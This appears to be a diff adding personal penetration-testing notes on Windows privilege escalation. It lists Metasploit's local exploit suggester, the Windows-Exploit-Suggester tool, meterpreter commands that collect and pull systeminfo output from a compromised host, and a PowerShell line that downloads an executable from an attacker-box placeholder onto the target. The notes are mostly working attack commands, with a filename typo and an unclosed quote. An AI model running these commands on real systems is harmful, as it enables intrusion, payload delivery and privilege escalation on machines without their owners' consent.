@@ -1,0 +1,23 @@
+Use MSFCONSOLES post/multi/recon/local_exploit_suggester
+
+Windows Exploit suggester 
+
+git clone https://github.com/GDSSecurity/Windows-Exploit-Suggester.git
+
+update the suggester 
+python2 windows-exploit-suggester.py --update 
+
+In meterpreter shell 
+
+execute -f "cmd.exe /c systeminfo > systeminfo.txt"
+
+download systeminfor.txt
+
+On Attack box 
+python2 windows-exploit-suggester.py --database 2018-09-10-mssb.xls  --systeminfo /root/Exploits//systeminfo.txt --quiet
+
+
+
+PowerShell Transfers 
+powershell -c "Invoke-WebRequest -Uri http://AttackboxIP/File.exe -OutFile C:\Users\Whatever\Desktop\File.exe
+
